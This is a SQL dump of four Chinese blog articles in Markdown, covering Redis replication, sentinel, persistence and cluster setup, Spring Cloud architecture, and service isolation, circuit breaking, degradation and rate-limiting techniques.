INSERT INTO `article` VALUES (56, 1, 'redis的主从复制与哨兵配置以及持久化方式', '2019/6/1560576444_00937A2ECCCFC8BC1CA8401E55DB0DB3.jpg', '### 搭建目标\n![Redis搭建主从复制与哨兵配置以及持久化方式.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626683921_Redis-搭建-主从复制与哨兵配置以及持久化方式.png)\n```java\n// 主从复制\n1. 注意在该主从复制下,只能有一个主(Master),可以有多个从(Slave),Redis是单线程的\n2. 主服务器可以读写操作,从服务器只有读操作\n3. 该主从复制,读写分离方式是Redis集群方式中的一种\n4. redis的主从复制只需要从服务进行配置即可\n\n// 哨兵配置\n1. 哨兵(sentinel) 是一个分布式系统,你可以在一个架构中运行多个哨兵(sentinel) 进程,这些进程使用流言协议(gossipprotocols)来接收关于Master是否下线的信息,并使用投票协议(agreement protocols)来决定是否执行自动故障迁移,以及选择哪个Slave作为新的Master\n2. 每个哨兵(sentinel) 会向其它哨兵(sentinel)、master、slave定时发送消息,以确认对方是否”活”着,如果发现对方在指定时间(可配置)内未回应,则暂时认为对方已挂(所谓的”主观认为宕机” Subjective Down,简称sdown)\n3. 若“哨兵群”中的多数sentinel,都报告某一master没响应,系统才认为该master\"彻底死亡\"(即:客观上的真正down机,Objective Down,简称odown),通过一定的vote算法,从剩下的slave节点中,选一台提升为master,然后自动修改相关配置.\n4. 虽然哨兵(sentinel) 释出为一个单独的可执行文件 redis-sentinel ,但实际上它只是一个运行在特殊模式下的 Redis 服务器，你可以在启动一个普通 Redis 服务器时通过给定 --sentinel 选项来启动哨兵(sentinel)\n\n// Redis的哨兵系统用于管理多个Redis服务器,该系统执行以下三个任务:\n1. 监控(Monitoring): 哨兵(sentinel) 会不断地检查你的Master和Slave是否运作正常\n2. 提醒(Notification):当被监控的某个 Redis出现问题时, 哨兵(sentinel) 可以通过 API 向管理员或者其他应用程序发送通知\n3. 自动故障迁移(Automatic failover):当一个Master不能正常工作时，哨兵(sentinel) 会开始一次自动故障迁移操作,它会将失效Master的其中一个Slave升级为新的Master, 并让失效Master的其他Slave改为复制新的Master; 当客户端试图连接失效的Master时,集群也会向客户端返回新Master的地址,使得集群可以使用Master代替失效Master\n\n```\n### 从服务器配置主从复制\n![TIM截图20190614220147.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560577674_TIM截图20190614220147.png)\n![TIM截图20190614220055.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560577674_TIM截图20190614220055.png)\n```c++\n// 1. 修改102从服务的redis.conf配置文件\nvi redis.conf\n// 修改内容\n// 配置指向主服务redis信息\nslaveof 192.168.147.101 6379\n// 配置指定主服务redis的密码\nmasterauth \"1234\"\n```\n\n### 检查主从复制是否配置成功\n![TIM截图20190614222043.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560577674_TIM截图20190614222043.png)\n```c++\n// 1. 关闭原先的redis,有的话\n./redis-cli -h 127.0.0.1 -p 6379 -a \"1234\" shutdown\n\n// 2. 关闭防火墙\nsystemctl stop firewalld\n\n// 3. 启动redis\n./redis-server /usr/local/redis/etc/redis.conf\n\n// 4. 连接redis进行测试\n./redis-cli -h 127.0.0.1 -p 6379 -a \"1234\"\n// 在主服务上进行set操作,查看从服务是否能获取到主服务的值,如果能获取到,说明主从服务配置成功\n// 在redisclient中输入info,可以查看到主从服务的配置信息\ninfo\n```\n### RDB与AOF持久化\n#### RDB持久化\n![TIM截图20190614234147.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560580358_TIM截图20190614234147.png)\n```java\n1. 以二进制文件形式,满足以某个时间点进行存储\n2. 开启单独的进程去进行记录操作,与当前redis主线程没有任何关联\n3. 非实时的记录,当服务器整个停电宕机时,会丢失数据\n4. 默认开启RDB,且redis关闭停止会进行最后记录\n\n```\n\n#### AOF持久化\n![TIM截图20190614233757.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560580358_TIM截图20190614233757.png)\n```java\n1. 实时日志记录形式只记录写的操作\n2. 效率不是很高,会影响到整体性能\n3. 实时的记录,数据较为安全\n4. 需修改redis.conf开启,将appendonly改为yes\n\n```\n### 确认主从复制配置完毕\n![TIM截图20190615121627.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615121627.png)\n\n### 哨兵服务配置\n#### 修改sentinel.conf文件\n![TIM截图20190615123436.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615123436.png)\n![TIM截图20190615123753.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615123753.png)\n```c++\n// 1. 进入redis源码目录\ncd redis-3.2.9\n\n// 2. 将sentinel.conf文件复制至编译make后的配置目录\ncp sentinel.conf  /usr/local/redis/etc\n\n// 3. 进行配置目录\ncd /usr/local/redis/etc/\n\n// 4. 修改sentinel.conf\nvi sentinel.conf\n// 修改内容\n// 配置主服务的信息,选举投票次数\nsentinel monitor mymaster 192.168.147.103 6379 1\n// 配置主服务的连接密码\nsentinel auth-pass mymaster 1234\n// 宕机读取状态间隔时间\nsentinel down-after-milliseconds mymaster 30\n```\n\n\n#### 启动哨兵,并检查主从服务状态\n![TIM截图20190615124637.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615124637.png)\n![TIM截图20190615124910.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615124910.png)\n```c++\n// 1. 主从服务全都进行重启\n./redis-cli -h 127.0.0.1 -p 6379 -a \"1234\" shutdown\n./redis-server /usr/local/redis/etc/redis.conf\n\n// 2. 主从服务和哨兵服务全都关闭防火墙\nsystemctl stop firewalld\n\n// 3. 哨兵服务启动哨兵\n./redis-server /usr/local/redis/etc/sentinel.conf --sentinel &\n\n// 4. 各服务连接服务\n./redis-cli -h 127.0.0.1 -p 6379 -a \"1234\"\n\n// 5. redis终端下执行info,查看信息\ninfo\n```\n\n### 原主服务宕机问题\n![TIM截图20190615125541.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615125541.png)\n![TIM截图20190615130230.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615130230.png)\n![TIM截图20190615130440.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615130440.png)\n![TIM截图20190615130615.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560582078_TIM截图20190615130615.png)\n```c++\n// 由于原主服务无需配置主从复制的主服务地址\n// 但是哨兵机制下,原主服务宕机重启后变为从服务\n// 原主服务变为从服务后,需要配置主从复制,否则数据无法同步\n// 1. 修改redis.conf\nvi /usr/local/redis/etc/redis.conf\n// 修改内容\n// 配置主服务的连接密码,建议参与集群的redis服务节点密码都设置为一样\nmasterauth \"1234\"\n```', 0, 0, 59, 0, 0, '2019-11-15 13:27:29', '2019-11-15 13:27:29', 0, 0);
INSERT INTO `article` VALUES (57, 1, 'redisCluster集群搭建', '2019/6/1560662567_CE03500D5E4A6209801E618D412C38DE5746405.jpg', '### 搭建目标\n![Redis搭建redisCluster集群搭建.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626684606_Redis-搭建-redisCluster集群搭建.png)\n```java\n1. 该种基于分片分摊的集群方式是推荐的redis集群方案\n2. 它不像主从复制集群那样造成数据冗余\n3. 该种集群方案是redis3后官方推荐的方式,参与集群节点数量最少为6\n\n```\n### 安装集群(每个节点都要进行如下配置)\n#### 安装依赖\n![TIM截图20190615181133.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615181133.png)\n```c++\n// 1. 安装依赖\nyum install ruby\nyum install rubygems\n\n// 2. 安装redis的gem\n// 资源地址: \ngem install -l redis-3.2.1.gem\n```\n\n#### 创建集群相关目录\n![TIM截图20190615182605.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615182605.png)\n```c++\n// 1. 创建cluster文件夹,便于与单机版隔离\nmkdir /usr/local/redis-cluster\n\n// 2. 创建相关目录\ncd /usr/local/redis-cluster/\nmkdir -p 6379/data\nmkdir bin\n\n// 3. 将源码目录的执行脚本进行拷贝\ncd ~/redis-3.2.9/src/\ncp mkreleasehdr.sh redis-benchmark redis-check-aof  redis-cli redis-server redis-trib.rb /usr/local/redis-cluster/bin\n```\n![TIM截图20190615182834.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615182834.png)\n![TIM截图20190615183020.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615183020.png)\n![TIM截图20190615183429.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615183429.png)\n![TIM截图20190615183714.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615183714.png)\n![TIM截图20190615183811.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615183811.png)\n![TIM截图20190615183949.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615183949.png)\n```c++\n// 1. 拷贝一份单机版至集群版目录\ncp -r /usr/local/redis    /usr/local/redis-cluster/6379/\n\n// 2. 进入etc目录修改redis.conf,若没有则从源码目录里拷贝到这里\ncd /usr/local/redis-cluster/6379/redis/etc/\nvi redis.conf\n// 修改内容\n// 后台运行\ndaemonize yes\n// 端口号\nport 6379\n// 添加当前节点服务的服务地址,不同服务地址的节点不能填写错误\nbind 192.168.147.101\n// 开启集群\ncluster-enabled yes\n// 该节点的集群配置文件,注意数字必须是与port端口一致\ncluster-config-file nodes-6379.conf\n// 集群重试的超时时间\ncluster-node-timeout 15000\n// 开启AOF持久化,redisCluster集群依赖于此\nappendonly yes\n// 进程文件,注意数字必须是与port端口一致\npidfile /var/run/redis_6379.pid\n// 文件尾部添加该行,路径为自创建的节点data目录,shift+g可移动到文件尾部\ndir /usr/local/redis-cluster/6379/data/\n```\n\n### 启动集群\n![TIM截图20190615230419.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615230419.png)\n![TIM截图20190615231443.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662694_TIM截图20190615231443.png)\n![TIM截图20190615231154.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662693_TIM截图20190615231154.png)\n![TIM截图20190615231222.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662694_TIM截图20190615231222.png)\n```c++\n// 1. 各节点关闭服务\n./redis-cli -h 192.168.147.101 -p 6379 shutdown \n\n// 2. 各节点关闭防火墙\nsystemctl stop firewalld\n\n// 3. 各节点启动redis服务\n./redis-server /usr/local/redis-cluster/6379/redis/etc/redis.conf\n\n// 4. 任一节点开启集群,列出所有参与集群的节点服务信息\n/usr/local/redis-cluster/bin/redis-trib.rb create --replicas 1 192.168.147.101:6379 192.168.147.102:6379 192.168.147.103:6379 192.168.147.104:6379 192.168.147.105:6379 192.168.147.106:6379\n\n// 5. 各节点连接redis查看集群状态\n./redis-cli -c -h 192.168.147.101 -p 6379\n```\n\n### 检查集群是否成功\n![TIM截图20190615232711.png](http://blog.img.tuwq.cn/upload/artimg/2019/6/1560662694_TIM截图20190615232711.png)\n```c++\n// 在节点中进行写操作,查看分片是否会被执行,节点是否会自动切换\n```', 0, 0, 52, 0, 0, '2019-11-15 13:22:55', '2019-11-15 13:22:55', 0, 0);
INSERT INTO `article` VALUES (58, 1, 'SpringCloud基本架构与组件', '2018/8/1535261739_9d6c574abf39bc9cf6ad8c63757ed012.jpg', '### 分布式系统概念\n![分布式服务什么是分布式服务.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623409092_分布式服务-什么是分布式服务.png)\n```java\n// 什么是分布式业务系统\n我们所说的分布式系统指的不是底层的分布式系统\n后端开发中我们更多的说法是叫分布式业务系统，把原来用java开发的一个大块系统，给拆分成多个子系统，多个子系统之间互相调用，形成一个大系统的整体。\n\n// 其余的分布式系统\n分布式存储系统，hadoop hdfs\n分布式计算系统，hadoop mapreduce，spark\n分布式流式计算系统，storm\n\n// 什么是分布式系统\n1. 分布式系统就是将一个完整的重量级服务拆分成多个根据业务特点独立的单独服务,使得系统具有扩容性,使得服务解耦\n2. 除了程序上的解耦外,也解放了多人开发的痛苦,如果不拆分，一个大系统几十万行代码，10个人维护一份代码，简直太痛苦了。代码经常改着改着就冲突了，各种代码冲突和合并要处理，非常耗费时间\n3. 拆分了以后，爽了，几十万行代码的系统，拆分成10个服务，平均每个服务就1~2万行代码，每个服务部署到单独的机器上。\n4. 每个人维护自己的那个服务就可以了，是自己独立的代码，跟别人没关系。再也没有代码冲突了\n5. 每个人维护的服务自己想怎么升级想怎么优化都可以,只需要维护输入输出正常,逻辑正常不出错\n\n// 怎么来拆分\n1. 一般根据业务来进行拆分,比如一个电商系统可以将拆分成用户服务、商品服务、订单服务、支付服务、分享服务等等\n\n// 分布式服务的问题\n系统拆分成分布式系统之后，大量的分布式系统面临的问题也是接踵而来\n1. 服务间如何相互通讯识别对方,如何相互调用\n2. 服务间发生了错误,如何让多台机器事务回滚,保持数据一致\n3. 服务间如何使用同步锁,避免并发问题\n4. 客户端与多服务之间如何实现会话session\n\n```\n\n### SpringCloud基本架构\n![SpringCloud基本架构.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624083996_SpringCloud基本架构.png)\n```java\n// SpringCloud\n1. SpringCloud是一个分布式业务系统的框架,它集合了一些分布式解决方案的组件\n2. SpringCloud依赖于SpringBoot依赖于SpringMVC\n3. SpringBoot简化xml配置,快速整合框架,与微服务无关\n\n// SpringCloud解决什么问题\n1. 注册中心,实现服务发现与服务注册\n2. 高可用多服务实例之间的服务调用与负载均衡\n3. 对外统一的接口网关\n4. 断路器,用于服务请求的限流、降级、熔断、降级\n5. 服务间统一的配置中心\n6. 消息总线,多个服务间通信\n7. 服务治理,对服务间调用的调用链的统计信息\n\n\n// SpringCloud常用注解\n1. @EnableEurekaServer	创建eureka注册中心\n2. @EnableEurekaClient	注册到eureka\n3. @LoadBalanced		使restTemplate支持ribbon负载均衡\n4. @EnableZuulProxy	开启zuul网关 \n5. @EnableConfigServer 开启配置中心\n6. @EnableFeignClients 开启feign客户端\n7. @HystrixCommand 	配置断路器参数\n```\n### 注册中心\n![SpringCloud注册中心原理.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624089431_SpringCloud-注册中心原理.png)\n```java\n1. 服务注册,服务会将的地址及端口信息告诉给注册中心,注册中心会将注册数据存储至服务注册表中,并立刻同步到ReadWrite的缓存中\n2. 服务注册后会定时的向eureka注册中心发送心跳包,证明本服务存活\n3. eureka的后台线程会定时的检查心跳包,并向注册表中新增或删除服务,进行注册表的更新,同时会向ReadWrite缓存立刻更新最新注册信息\n4. eureka的后台会线程会定时的将ReadWrite缓存数据更新至ReadOnly缓存中\n5. 服务发现,需要调用其他服务的服务会定时从eureka的ReadOnly缓存中不断拉取注册服务信息并写入本服务的本地缓存中\n\n// ReadWrite与ReadOnly\n1. 之所以要分两份缓存,是因为为了解决多服务并发读写的问题\n\n// 定时检查\n1. 因为eureka的定时检查以及写入缓存更新缓存的时间过久,一般情况下,需要修改这些定时任务的检查时间配置\n\neureka.server.responseCacheUpdateIntervalMs = 3000  // 双缓存的同步时间\neureka.client.registryFetchIntervalSeconds = 30000  // 服务拉取注册服务数据的时间\neureka.client.leaseRenewalIntervalInSeconds = 30  // 服务与注册中心的心跳间隔\neureka.server.evictionIntervalTimerInMs = 60000  // 注册中心检查心跳\neureka.instance.leaseExpirationDurationInSeconds = 90 // 心跳超过多少秒服务注册进行连接断开服务发现的时效性变成秒级，几秒钟可以感知服务的上线和下线\neureka.server.enable-self-preservation=false //自我保护: 超过一定比例服务没有发送心跳,不会下线任何服务,保护注册表不会因为网络异常进行变动,但是这有问题,必须关闭自我保护这个功能\n\n```\n### 远程调用\n![SpringCloudFeign与Ribbon.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624089892_SpringCloud-Feign与Ribbon.png)\n```java\n1. 从本地的eureka注册表缓存中获取出来对方机器的列表\n2. 使用Ribbon进行负载均衡，选择一台机器的服务出来\n3. 接着针对那台机器的服务使用基于httpClient的fegin发送Http请求\n\n```\n### 接口网关\n![SpringCloudZuul网关.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624091265_SpringCloud-Zuul网关.png)\n```java\n网关拦截所有请求,任何请求先交给接口网关,然后再用网关进行转发\n相当于于微服务中的总拦截器过滤器\n// 网关作用\n(1)动态路由: 新开发某个服务，动态把请求路径和服务的映射关系热加载到网关里去；服务增减机器，网关自动热感知,网关无需关机重启\n(2)灰度发布: 将新版本与旧版本的服务一同部署并发布,测试新版本服务的稳定性\n(3)授权认证: 统一对请求检查授权\n(4)性能监控: 每个API接口的耗时、成功率、QPS进行统计\n(5)系统日志: 统一记录请求日志\n(6)数据缓存: 对请求服务的数据进行缓存,新请求进来无需请求服务,而是直接从网关返回数据\n(7)限流熔断: 对过量请求进行限流熔断降级\n\n// 各种网关\n1. Zuul：SpringCloud的网关,核心网关功能都比较简单，但是比如灰度发布、限流、动态路由之类的都没有实现，很多都要自己做二次开发\n2. Kong：依托于Nginx实现，OpenResty，lua实现的模块，有现成的一些插件，可以直接使用,由于不是Java实现,二次开发难度大\n3. 自制网关: 一般使用javaservlet或netty进行实现高性能网关,所有实现功能自己把控\n\n```\n\n### 断路器\n![分布式系统服务隔离.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624091604_分布式系统-服务隔离.png)\n![分布式系统服务熔断.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624091604_分布式系统-服务熔断.png)\n```java\n// 断路器作用\n1. 隔离: 每个服务,都有独立于自己的线程池,不与其他服务的的线程共享,防止某服务挂掉影响其他服务的正常访问,做到舱壁隔离\n2. 熔断: 大量请求访问多次失败后,会认为这个服务有故障,那么就会对该服务进行熔断,一段时间内会对请求该服务的所有请求进行降级,直到熔断恢复为止\n3. 降级: 当服务失败后,对该请求进行备用的处理,比如返回友好提示或默认值或本地缓存的备用数据\n4. 限流: 限制该线程池或信号量的最大请求访问量,比如十秒内超过20个则对该请求给予降级\n5. 运维监控：监控+报警+优化，如果出现各种异常情况及时报警，从而发现并优化一些系统的配置、参数和代码\n\n// 断路器在何时展现它的功能\n1. 大量请求抵达后端服务器,服务器无法承受如此多的连接,*导致其他服务出现阻塞*,为了保证用户体验与系统稳定,*这时给出一个默认的返回,如服务繁忙,请稍后再试等信息,称之为降级*\n2. 大量请求抵达后端服务器,服务器无法承受,甚至可能导致数据库崩溃,进而导致整个服务系统瘫痪,称之为雪崩,*这时给出一个接口连接上限值,当请求达到或超越上限值时,将接下来的请求全部降级,保证接口不会崩溃,称之为熔断*\n\n// 熔断与降级有何区别\n1. 熔断是要保护服务提供者，是在服务提供者忙到不行的时候，减少对它的访问量，从而*避免“雪崩效应”*而导致服务提供者的应用实例全部崩溃\n2. 降级是为了让用户得到反馈,当服务繁忙时*给出一个默认返回*\n```\n\n### 配置中心\n![SpringCloud配置中心.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624092285_SpringCloud-配置中心.png)\n```java\n1. 用来统一所有服务的配置信息\n2. 存放区分环境的配置 dev(测试环境),pre(预发布),prd(正式生产环境),uat(用户测试)\n3. SpringCloud配置中心将配置文件信息存放在版本控制(svn,git中))\n3. 配置中心的配置信息可被所有服务进行读取\n4. 配合消息总线可以不重启项目进行刷新\n\n```\n\n### 消息总线\n![SpringCloud消息总线.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624092750_SpringCloud-消息总线.png)\n```java\n1. 使用轻量级的消息代理来构建一个共用的消息主题来连接各个微服务实例 \n2. 它广播的消息会被所有在注册中心的微服务实例监听和消费,称为消息总线\n3. 消息代理属于中间件,设计代理的目的就是为了能够从应用程序中传入消息,并执行一些特别的操作\n4. 消息总线其实通过消息中间主题模式,它使用广播消息的机制让所有在注册中心微服务实例进行监听和消费,以广播形式将消息推送给所有注册中心服务列表\n5. 比如配合配置中心进行无重启刷新配置信息 /actuator/refresh或/actuator/bus-refresh\n6. 其原理即是利用了消息队列,并将所有服务注册为消费者并向其发送消息\n\n```\n\n### 服务治理\n![SpringCloud服务治理.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624093205_SpringCloud-服务治理.png)\n```java\n1. 为了实现请求跟踪,当请求发送到分布式系统的入口端点时,只需要服务跟踪框架为该请求创建一个唯一的跟踪标识,同时在分布式系统内部流转的时候,框架始终保持传递该唯一标识,直到返回给请求方为止这个唯一id就是*traceId*,通过traceId的记录,我们就能将所有请求过程的日志关联起来\n2. 为了统计各处理单元的时间延迟,当请求到达各个服务组件时,或是处理逻辑到达某个状态时,也通过一个唯一标识来标记它的开始,具体过程以及结束,这个唯一标识就是*spanId*,对于每个span来说,它必须有开始或结束两个节点,通过记录开始span和结束span的时间戳,就能统计出该span的时间延迟,除了时间戳记录之外,它还可以包含一些其他元数据,比如事件名称,请求信息等\n3. 为了记录处理单元的上一次处理单元的服务组件请求,所有记录了*parentId*,首个服务的parentId为null,traceId记录整个调用链全局id,spanId记录每一次请求,parentId记录每一次请求的上一次请求的id\n\n// zipkin\n1. zipkin是一个开放源代码分布式的跟踪系统,由推特开源,致力于收集服务的定时数据,以解决微服务架构中的延迟问题,包括数据的收集,存储,查找和展现\n2. 每个服务向zipkin报告计时数据,例如用户每次请求服务的处理时间等,可方便的监测系统中存在的瓶颈,zipkin会根据调用关系通过zipkinUI生成*依赖关系图(调用链)*\n\n// sleuth\n1. sleuth为服务之间调用提供链路追踪,通过sleuth可以清除的了解到一个服务请求经过了哪些服务,每个服务处理花费多长,从而让我们可以很方便的理清各微服务间的调用关系,此外sleuth可以帮助我们更多\n2. 耗时分析: 通过sleuth可以很方便的了解到每个采样请求的耗时,从而分析出哪些服务调用比较耗时\n3. 可视化错误: 对于程序未捕捉的异常,可以通过集成zipkin服务界面上看到\n4. 链路优化: 对于调用比较频繁的服务,可以针对这些服务实施一些优化措施\n5. sleuth可以结合zipkin,将信息发送到zipkin,利用zipkin的存储来存储信息,利用zipkinUI来展示数据\n```', 0, 0, 217, 0, 0, '2019-11-26 13:35:52', '2019-12-14 13:35:52', 0, 0);
INSERT INTO `article` VALUES (59, 1, '服务雪崩,隔离,熔断与降级', '2019/1/1547366832_64495434_p0_master1200.jpg', '### 服务雪崩与服务堆积\n![分布式系统服务雪崩与堆积.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623903476_分布式系统-服务雪崩与堆积.png)\n```java\n// 服务雪崩与服务堆积是什么\n1. 默认情况下,只有tomcat的一个线程池维护所有的服务接口\n2. 如果大量请求访问同一个服务,达到配置线程数的极限,会导致其他服务无法访问\n3. 如果tomcat线程池满了,前面大部分请求没有结束,那么其他服务会因为请求线程不足而全部无法访问\n3. 如果请求的那个服务有问题,比如处理严重缓慢,崩溃.那么其他服务也会遭受到影响,这是不合理的\n\n// 服务堆积\n1. 大量请求访问一个服务或接口,该服务迟迟未处理结束\n2. 后续更多的请求访问该接口需要处理,但前面的请求依旧没有处理完\n3. 大量的请求在等待处理,造成了请求堆积在一个服务上\n\n// 服务雪崩\n1. 主要产生雪崩原因是因为服务请求堆积问题\n2. 假设默认tomcat最大线程池是50,尝试第51个请求会阻塞,请求在等待,如果堆积请求过多,那么就会造成服务雪崩\n3. 大量的服务堆积请求会造成其他接口无法访问,导致服务崩溃\n4. 恶意的大量接口攻击可以导致服务雪崩\n\n// 解决服务雪崩的方式\n1. 隔离: 每个服务,都有独立于自己的线程池,不与其他服务的的线程共享,防止某服务挂掉影响其他服务的正常访问,做到舱壁隔离\n2. 熔断: 大量请求访问多次失败后,会认为这个服务有故障,那么就会对该服务进行熔断,一段时间内会对请求该服务的所有请求进行降级,直到熔断恢复为止\n3. 降级: 当服务失败后,对该请求进行备用的处理,比如返回友好提示或默认值或本地缓存的备用数据\n4. 限流: 限制该线程池或信号量的最大请求访问量,比如十秒内超过20个则对该请求给予降级\n5. 运维监控：监控+报警+优化，如果出现各种异常情况及时报警，从而发现并优化一些系统的配置、参数和代码\n\n\n```\n### 服务隔离\n![分布式系统服务隔离.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623906980_分布式系统-服务隔离.png)\n```java\n1. 要解决服务雪崩以及堆积的核心问题，就是将多个依赖服务的调用分别隔离到各自自己的资源池内\n2. 避免对某一个依赖服务的调用，因为依赖服务的接口调用的延迟或者失败，导致服务所有的线程资源全部耗费在这个服务的接口调用上\n\n// 线程池隔离与信号量隔离\n// 线程池隔离\n1. 实际进行请求的线程使用的是隔离组件的线程而不是tomcat的线程\n2. tomcat的线程在抵达隔离组件后便完成了资源释放\n3. 适合绝大多数的场景,使用在对依赖服务的网络请求的调用和访问，有timeout超时这种问题的\n\n// 信号量隔离\n1. 信号量的隔离,隔离组件不会创建线程池,而是继续使用tomcat的线程继续进行处理\n2. 这种信号量隔离是没有timeout机制的,所以不能用于网络请求\n3. 适合于不是对外部依赖的访问，而是对内部的一些比较复杂的业务逻辑的访问，不涉及任何的网络请求\n4. 信号量可以做普通限流，因为信号量不需要去捕获timeout类似的问题\n5. 某一块代码复杂业务逻辑的并发量突然太高并且这里很耗时，会导致很多线程卡在这里不太好\n6. 对这块复杂代码耗时的业务逻辑做个基本的资源隔离，可以避免因为内部复杂的低效率的代码导致的大量的线程被阻塞住\n\n实际上如果某个服务的某个接口非常耗时,但是该服务的其他接口并不耗时,也可以单独给这个服务的这个接口单独配置隔离,防止因为该接口的影响导致其他接口的雪崩\n```\n\n### 服务熔断\n![分布式系统服务熔断.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623910098_分布式系统-服务熔断.png)\n```java\n1. 调用外部依赖服务的接口,出现了任何异常的情况\n2. 对每个外部依赖,无论是服务接口,中间件,资源隔离的线程池/信号量，如果资源池已满,触发拒绝的情况\n3. 访问外部依赖的时候,访问时间过长,导致超时的情况\n上述三种情况，都是异常情况，对外部依赖的东西访问的时候出现了异常，发送异常事件到断路器中去进行统计\n\n1. 断路器会某服务接口的调用成功/失败/拒绝/超时等事件的次数进行统计\n2. 服务的失败、拒绝与异常次数达到阈值时,开启熔断,对后续的请求进行降级处理,保护当前服务不会遭到崩溃\n\n// 断路器熔断步骤\n1. 请求经过断路器的流量超过了一定的阈值\n2. 比如要求在10s内，经过断路器的流量必须达到20个,在10s内，经过断路器的流量才10个，那么根本不会去判断要不要断路\n3. 如果断路器统计到的请求异常调用的占比超过了一定的阈值\n4. 比如说10s内，经过断路器的请求流量达到了30个；同时其中异常的访问数量，占到了一定的比例，比如说60%的请求都是异常(报错，timeout，reject),就会开启断路器的熔断机制\n5. 此时断路器会从close状态转换到open状态\n6. 断路器打开的时候，所有经过该断路器的请求全部被短路，不会调用后端服务，而是直接fallback降级\n7. 断路经过了一段时间之后，会half-open，让一条请求经过断路器，看能不能正常调用。如果调用成功了，那么就自动恢复，转到close状态\n\n```\n### 服务降级\n![分布式系统服务降级.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623910845_分布式系统-服务降级.png)\n```java\n1. 调用外部依赖服务的接口,出现了任何异常的情况\n2. 对每个外部依赖,无论是服务接口,中间件,资源隔离的线程池/信号量，如果资源池已满,触发拒绝的情况\n3. 访问外部依赖的时候,访问时间过长,导致超时的情况\n4. 断路器的熔断机制被开启的情况\n上述四种情况(error, reject,timeout,circuit breaker)，都会去调用fallback降级机制\n\n1. 当请求异常时,此时将会判定此次请求需要降级处理,降级时会调用备用的fallback降级方法\n2. 降级方法中根据自身业务对客户端返回默认提示或页面或本地缓存的备用数据\n\n```\n\n### 服务限流\n![分布式系统服务限流.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623911842_分布式系统-服务限流.png)\n```java\n1. 限制在一段时间内,通过的请求线程数量\n2. 当超过这段时间的请求量时,对超出的请求进行降级处理\n\n// 服务限流的实现算法\n1. 滑动计数器\n2. 令牌桶\n3. 漏桶\n\n```\n#### 滑动计数器\n![分布式系统服务限流时间滑动窗口.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623914046_分布式系统-服务限流-时间滑动窗口.png)\n```java\n1. 已时间格子的滑动窗口实现服务限流\n2. 滑动窗口随当前时间变化不断向后移动,最后的格子是当前的时间\n3. 进行请求时,检查前面的时间格子并根据制定的规则,得出此次请求是否应该被通过还是降级处理\n```\n\n\n#### 令牌桶\n![分布式系统服务限流令牌桶.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623914046_分布式系统-服务限流-令牌桶.png)\n```java\n1. 令牌桶分为两个动作\n2. 动作1,固定速率往桶中存入令牌\n3. 动作2,客户端如果想访问请求,先从桶中获取令牌\n4. 创建令牌桶开启独立线程以*固定的速率往桶中存放令牌*,固定速率2R/S,表示每秒往桶中放入两个令牌\n5. 如果客户端从桶中获取不到令牌,进行降级处理\n\n```\n\n#### 漏桶\n![分布式系统服务限流漏桶.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1623914046_分布式系统-服务限流-漏桶.png)\n```java\n1. 客户端请求像水滴一样流入至水桶中\n2. 成功流出的水滴说明是通过的请求进行正常业务逻辑处理\n3. 超过水桶容量而溢出的水滴被判定是需限流的请求,进行降级处理\n4. 已固定速率从桶中流出水滴,流出的水滴(请求),作为有效请求\n5. 当流入速率大于流出速率,那么水桶会溢出,溢出的水滴(请求)都进行降级处理\n\n```', 0, 0, 266, 0, 0, '2019-11-26 13:36:43', '2020-08-27 13:36:43', 0, 0);
